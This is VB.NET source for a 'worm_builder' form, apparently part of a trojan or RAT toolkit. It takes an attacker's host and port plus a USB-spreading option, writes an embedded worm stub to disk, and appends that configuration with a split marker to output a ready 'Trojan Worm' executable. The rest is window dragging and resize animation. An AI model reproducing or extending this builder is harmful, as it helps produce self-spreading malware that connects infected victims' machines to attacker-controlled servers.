Public Class worm_builder
    Dim stub, text1, text2, text3 As String
    Const spl As String = "abccba"
    Dim ex As Exception
    Dim s As New SaveFileDialog
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label7.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label7.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label7.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub



#End Region
    Sub start_worm()
        If TextBox1.Text = "" Or TextBox2.Text = "" Then
            MsgBox("Complete Information Please At least Host & Port  ", MsgBoxStyle.Critical, "Create Server")
        Else

            s.ShowDialog()
            If s.FileName > "" Then
                text1 = TextBox1.Text
                text2 = TextBox2.Text

                Dim temp As String = IO.Path.GetTempPath() & "Stub.exe"

                IO.File.WriteAllBytes(temp, My.Resources.SpyByte_Pal_Worm_)
                Dim path As String = IO.Path.GetDirectoryName(s.FileName) & "\"
                Dim savename As String = s.FileName.Replace(path, "")

                FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                stub = Space(LOF(1))
                FileGet(1, stub)
                FileClose(1)
                FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, stub & spl & text1 & spl & text2 & spl & usb.CheckState)
                FileClose(1)
                SpeakThread("Trojan Worm was built successfully")
                MsgBox("Trojan Worm was built successfully", MsgBoxStyle.Information)
            Else
                MsgBox(ex.Message, MsgBoxStyle.Critical)
            End If
        End If
    End Sub
    Private Sub worm_builder_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Loading.wormFinished = False
        LoaderTimer.Start()

    End Sub
    Dim Currh As Double = 0.0

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        'Build
        start_worm()
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        Me.Close()
    End Sub

    Private Sub LoaderTimer_Tick(sender As System.Object, e As System.EventArgs) Handles LoaderTimer.Tick
        '219
        If Currh < 218 Then
            Currh += 21.9
            Me.Size = New Size(Me.Width, Currh)
        Else
            LoaderTimer.Stop()
            Reforge()
            Exit Sub
        End If
    End Sub
    Sub Reforge()
        Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2 - Me.Width / 2, Screen.PrimaryScreen.WorkingArea.Size.Height / 2 - 109)

        Me.Refresh()
    End Sub
End Class